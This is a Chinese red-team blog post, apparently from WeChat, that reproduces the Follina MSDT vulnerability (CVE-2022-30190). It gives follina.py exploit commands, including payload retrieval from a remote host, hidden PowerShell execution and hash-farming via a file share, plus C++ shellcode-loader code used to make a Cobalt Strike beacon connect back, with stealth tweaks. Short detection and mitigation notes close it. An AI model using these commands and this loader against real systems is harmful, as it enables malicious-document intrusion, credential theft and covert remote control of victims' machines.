<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/VRwytJEL-bkqMDWS-IG7Pw)

前言
==

Microsoft Windows Support Diagnostic Tool (MSDT) Remote Code Execution Vulnerability对应的cve编号为`CVE-2022-30190`，其能够在非管理员权限、禁用宏且在windows defender开启的情况下绕过防护，达到上线的效果。  

当从Word等应用程序使用 URL 协议调用 MSDT 时存在远程执行代码漏洞，攻击者通过制作恶意的Office文档，诱导用户在受影响的系统上打开恶意文档后，在宏被禁用的情况下，仍可通过 `ms-msdt` URI执行任意PowerShell代码，当恶意文件保存为RTF格式时，无需受害者打开文件，即可通过资源管理器中的预览窗格在目标系统上执行任意代码。

微软官方通报该漏洞后，红队蓝军团队第一时间对其进行分析复现。

适用版本
====

在这里笔者只测试了如下版本，对于Office的 `Insider` 和 `Current` 和版本无法进行利用

> Microsoft Office LTSC 专业增强版 2021
> 
> Office 2013
> 
> Office 2016

环境搭建
====

这里笔者使用`Office Tool Plus`进行office的安装(记得打一下广告费)，官网如下

```
https://otp.landian.vip/zh-cn/  

```

![图片](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6fibd1w4UdzOkJkZYvHZN2sLutbnFujgic3HM1Ycyj6rUCDrp19xN9AznWZatTcZVX3qP0Rv9W9aag/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)  

github链接如下

```
https://github.com/YerongAI/Office-Tool/releases/tag/v8.3.10.7  

```

这里我安装`Microsoft Office LTSC 专业增强版 2021`版本

![图片](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6fibd1w4UdzOkJkZYvHZN2svlXbPvyDjvXvrlPtAeBLD5x0ReGxRicQxWgp3ib2e3xNc8znwr044ejw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)  

笔者下载的版本为2108

![图片](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6fibd1w4UdzOkJkZYvHZN2sOPNN8nSXkHroqV20iblWNRJURZAIF7jsKofEcqsobst05SEZcMObBsQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)  

漏洞复现
====

弹计算器
----

我们找到poc，链接如下

```
https://github.com/chvancooten/follina.py  

```

我们可以看到作者给出了以下几种用法

![图片](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6fibd1w4UdzOkJkZYvHZN2s3Tsj1gcKXQkvc3aia1k1PFratD4YkFJa1ax9icMhLX5BLLZNen4icsN9A/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)  

```
# Execute a local binary  
python .\follina.py -m binary -b \windows\system32\calc.exe  
  
# Execute a binary from a file share (can be used to farm hashes 👀)  
python .\follina.py -m binary -b \\localhost\c$\windows\system32\calc.exe  
  
# Execute an arbitrary powershell command  
python .\follina.py -m command -c "Start-Process c:\windows\system32\cmd.exe -WindowStyle hidden -ArgumentList '/c echo owned > c:\users\public\owned.txt'"  
  
# Run the web server on the default interface (all interfaces, 0.0.0.0), but tell the malicious document to retrieve it at http://1.2.3.4/exploit.html  
python .\follina.py -m binary -b \windows\system32\calc.exe -u 1.2.3.4  
  
# Only run the webserver on localhost, on port 8080 instead of 80  
python .\follina.py -m binary -b \windows\system32\calc.exe -H 127.0.0.1 -P 8080  

```

这里我们首先使用最后一种，弹一下计算器，使用如下payload生成一下

```
python follina.py -m binary -b \windows\system32\calc.exe -H 0.0.0.0 -P 8080  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

然后这里直接点击`clickme.docx`即可

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

效果如下，这里会弹出一个程序兼容性疑难解答，这里不用管

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

上线cs
----

我们首先尝试直接使用exe上线，首先cs生成一个不经过任何处理的马

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

这里使用之前的payload进行尝试，把文件放到`windows\system32`下

```
python follina.py -m binary -b \windows\system32\artifact.exe -H 0.0.0.0 -P 8080  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  
![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

还是点击`clickme.docx`，但是没有上线

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

但是这里没有上线，这里笔者进行问题的排查，换一个也在`system32`下的`mmc.exe`，这里是可以成功打开的

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

那么这个payload肯定是没有问题的，那么问题就出在我们上线cs的exe上，这里笔者尝试使用x86的payload、使用powershell加载都以失败告终，最后找到了解决方法，使用cs生成的shellcode自己通过`VirtualAlloc`申请内存并编译即可上线

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  
![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

然后编写代码实现将shellcode加载到内存空间，这里就用最简单的`VirtualAlloc`申请空间然后用指针指向申请的空间，这里shellcode加解密去绕AV师傅们可自行拓展，实现代码如下(shellcode填充到`buf[]`数组即可)

```
#include <iostream>  
#include <windows.h>  
  
/* length: 833 bytes */  
unsigned char buf[] = "";  
  
  
void shellcode()  
{  
 PVOID p = NULL;  
 p = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);  
 if (p == NULL)  
  printf("VirtualAlloc error : %d\n", GetLastError());  
 else  
  printf("VirtualAlloc successfully , address : %x\n", p);  
  
 if (!memcpy(p, buf, sizeof(buf)))  
  printf("Write shellcode failed\n");  
 else  
  printf("Write shellcode successfully\n");  
  
 ((void(*)())p)();  
  
}  
  
  
int main(int argc, char** argv)  
{  
    shellcode();  
    getchar();  
  
 return 0;  
}  

```

编译生成`MyVirtualAlloc.exe`

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

然后使用exp进行攻击，这里笔者测试了使用远程加载还是不能上线

```
python follina.py -m binary -b F:\C++\MyVirtualAlloc\x64\Release\MyVirtualAlloc.exe -H 0.0.0.0 -P 8080  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  
![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

使用`-c`命令直接启动exe上线成功

```
python follina.py -m command -c "Start-Process F:\C++\MyVirtualAlloc\x64\Release\MyVirtualAlloc.exe"  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  
![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

这里为了更加隐蔽直接去掉黑框

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

改变入口点为`mainCRTStartup`

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

点击`clickme.docx`上线成功

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

利用排查
====

若利用过漏洞则在以下路径会留有注册表

```
HKEY_USERS\$USER_SID\SOFTWARE\Microsoft\Office\$OFFICE_VERSION\Common\Internet\Server Cache  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

修复
==

禁用`MSDT URL`协议

> 1、以管理员身份运行命令提示符
> 
> 2、备份注册表项后，执行命令：reg export HKEY_CLASSES_ROOT\ms-msdt filename
> 
> 3、再执行命令：reg delete HKEY_CLASSES_ROOT\ms-msdt /f

若需要撤销禁用则用管理员身份打开cmd执行：`reg import filename`

  

加下方wx，拉你一起进群学习：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

往期推荐

[

APC机制初探



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247497042&idx=1&sn=e0866a963f6e6eb9c3d9b7b2bd5364f8&chksm=ce674feef910c6f8aa07e56161458b93db0573039b434e951095086d46f09b1e6a41e45c85d5&scene=21#wechat_redirect)

[

hw面试题解答版(2)



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247496710&idx=1&sn=ada0141e682cbbe73c9dda9667d36d36&chksm=ce674ebaf910c7acb26ecca4432aadd56e52e5cefa487261e1b817bba4a0ac30cc8a988d3f72&scene=21#wechat_redirect)

[

利用NetBIOS欺骗攻击盗取hash



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247496709&idx=1&sn=0050666192a96866c991d8a1b639c935&chksm=ce674eb9f910c7af7580fcfff36619b7977f905a5377e235072f787a51fc6c3087d536a368f3&scene=21#wechat_redirect)

[

绕过360添加计划任务



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247496617&idx=1&sn=343036b85a7dce114d797d7686c493ff&chksm=ce674915f910c0036ad417501ef42d849f7ca4dec220859d2f044ee7cee312c4fd58c24f4ac5&scene=21#wechat_redirect)

[

从外围打点到内网渗透拿下域控



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247496374&idx=1&sn=735d75dbda3464d1e30d3c29cd19e760&chksm=ce67480af910c11c346a20eecb1808c0ebd0b2c253c49ea17607f7633edb93c14b4921023e0f&scene=21#wechat_redirect)

[

父进程隐藏



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247496299&idx=2&sn=f9b9d9c4417a2f26d04057262198c595&chksm=ce6748d7f910c1c1ab65b6b2eaf71ebbc45fad1e8029b76b1d2f3df45ba3481d59631a27adac&scene=21#wechat_redirect)

[

ATT&CK矩阵的攻与防



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247496275&idx=1&sn=54e3094eaac1b43d0720dd3d9fb3b3ca&chksm=ce6748eff910c1f9f98d66fb6dad809e82c4f7a58bdbd88eb6da3dbd042b921ea6408535193c&scene=21#wechat_redirect)

[

巧用cpl文件维权和免杀



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247495882&idx=1&sn=299fa1d4080d213c7fb966f0b2f14bac&chksm=ce674a76f910c3608917ec6e685b4d3b47c196381043ad2f28a83f007ea0295297964fbcf312&scene=21#wechat_redirect)

  

 ![](http://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6flNJqwg2VJrVbXvO9N2mzz6piagicPIiaCNPGH1tNA1N43RLy5bLY4PyUqNGYocicJMqrusALD0icibkg/0?wx_fmt=png) ** 红队蓝军 ** 一群热爱网络安全的人，知其黑，守其白。不限于红蓝对抗，web，内网，二进制。 72篇原创内容   公众号

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)